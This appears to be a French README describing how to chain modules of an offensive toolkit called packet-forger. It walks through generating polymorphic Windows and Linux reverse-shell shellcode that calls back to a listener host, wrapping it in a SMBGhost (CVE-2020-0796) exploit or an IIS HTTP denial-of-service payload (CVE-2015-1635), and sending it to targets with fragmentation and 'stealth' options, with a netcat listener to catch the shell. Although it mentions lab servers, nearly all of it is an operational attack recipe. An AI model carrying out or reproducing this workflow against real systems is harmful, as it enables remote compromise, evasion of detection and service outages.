# 🔗 Workflow d'Intégration - Packet Forger Labs

## Vue d'Ensemble

Le module `packet-forger-labs` s'intègre avec les autres modules du suite pour créer un workflow complet :

```
payload-forger-payloads → packet-forger-labs → packet-forger-core
     (génération)          (encapsulation)        (transport)
```

## Workflow Type

### Étape 1 : Générer le Payload (packet-forger-payloads)

```bash
cd packet-forger-payloads
./bin/payload-builder build windows reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --polymorphic \
    --output shellcode.bin
```

**Résultat** : `shellcode.bin` (payload binaire exécutable)

### Étape 2 : Encapsuler dans un Exploit CVE (packet-forger-labs)

```bash
cd ../packet-forger-labs

# Option A: Utiliser un exploit CVE existant
python3 -c "
from cve.CVE_2020_0796_smbghost import generate_smb_compression_payload
with open('../packet-forger-payloads/shellcode.bin', 'rb') as f:
    shellcode = f.read()
payload = bytearray(4096)
len = generate_smb_compression_payload(shellcode, len(shellcode), payload, 4096)
with open('exploit.bin', 'wb') as f:
    f.write(payload[:len])
"

# Option B: Utiliser directement le payload (sans CVE)
cp ../packet-forger-payloads/shellcode.bin exploit.bin
```

**Résultat** : `exploit.bin` (payload encapsulé dans un exploit CVE ou brut)

### Étape 3 : Transporter via le Core (packet-forger-core)

```bash
cd ../packet-forger-core
sudo ./bin/packet-forger-core \
    --payload ../packet-forger-labs/exploit.bin \
    --target 192.168.10.5 \
    --port 445 \
    --transport-profile windows \
    --fragment \
    --stealth
```

**Résultat** : Payload envoyé via TCP/IP avec encapsulation appropriée

## Exemples Concrets

### Exemple 1 : Exploitation SMBGhost (CVE-2020-0796)

```bash
# 1. Générer le shellcode
cd packet-forger-payloads
./bin/payload-builder build windows reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --output smbghost_shellcode.bin

# 2. Encapsuler dans SMBGhost
cd ../packet-forger-labs
python3 << EOF
from cve.CVE_2020_0796_smbghost import generate_smb_compression_payload
with open('../packet-forger-payloads/smbghost_shellcode.bin', 'rb') as f:
    shellcode = f.read()
payload = bytearray(4096)
len = generate_smb_compression_payload(shellcode, len(shellcode), payload, 4096)
with open('smbghost_exploit.bin', 'wb') as f:
    f.write(payload[:len])
EOF

# 3. Transporter
cd ../packet-forger-core
sudo ./bin/packet-forger-core \
    --payload ../packet-forger-labs/smbghost_exploit.bin \
    --target 192.168.10.5 \
    --port 445
```

### Exemple 2 : Test HTTP DoS (CVE-2015-1635)

```bash
# 1. Générer le payload DoS
cd packet-forger-labs/cve
./CVE-2015-1635-http-dos /iisstart.htm > http_dos_payload.bin

# 2. Transporter
cd ../../packet-forger-core
sudo ./bin/packet-forger-core \
    --payload ../packet-forger-labs/cve/http_dos_payload.bin \
    --target 192.168.10.5 \
    --port 80
```

### Exemple 3 : Payload Direct (Sans CVE)

```bash
# 1. Générer le shellcode
cd packet-forger-payloads
./bin/payload-builder build linux reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --output direct_payload.bin

# 2. Transporter directement (le core encapsule automatiquement)
cd ../packet-forger-core
sudo ./bin/packet-forger-core \
    --payload ../packet-forger-payloads/direct_payload.bin \
    --target 192.168.10.5 \
    --port 80
```

## Séparation des Responsabilités

### packet-forger-payloads
- ✅ Génère des payloads binaires
- ❌ Ne forge PAS de paquets
- ❌ Ne connaît PAS les CVEs

### packet-forger-labs
- ✅ Implémente des exploits CVE
- ✅ Encapsule des payloads dans des exploits
- ✅ Fournit des serveurs de test
- ❌ Ne forge PAS de paquets TCP/IP

### packet-forger-core
- ✅ Forge des paquets TCP/IP
- ✅ Transporte des payloads opaques
- ❌ Ne génère PAS de shellcode
- ❌ Ne connaît PAS les CVEs

## Avantages de cette Architecture

1. **Modularité** : Chaque module a un rôle précis
2. **Réutilisabilité** : Les payloads peuvent être utilisés par d'autres outils
3. **Testabilité** : Chaque module peut être testé indépendamment
4. **Maintenabilité** : Modifications isolées par module
5. **Pédagogie** : Compréhension claire de chaque étape

## Workflow avec Serveurs Vulnérables

### Test Local Complet

```bash
# Terminal 1: Serveur vulnérable
cd packet-forger-labs/servers
python3 vulnerable_http_server.py 8080

# Terminal 2: Générer et envoyer
cd packet-forger-payloads
./bin/payload-builder build linux reverse \
    --lhost 127.0.0.1 --lport 4444 \
    --output test.bin

cd ../packet-forger-core
sudo ./bin/packet-forger-core \
    --payload ../packet-forger-payloads/test.bin \
    --target 127.0.0.1 \
    --port 8080

# Terminal 3: Listener
nc -lvp 4444
```

---

**Note**: Ce workflow démontre la séparation claire des responsabilités entre les modules.

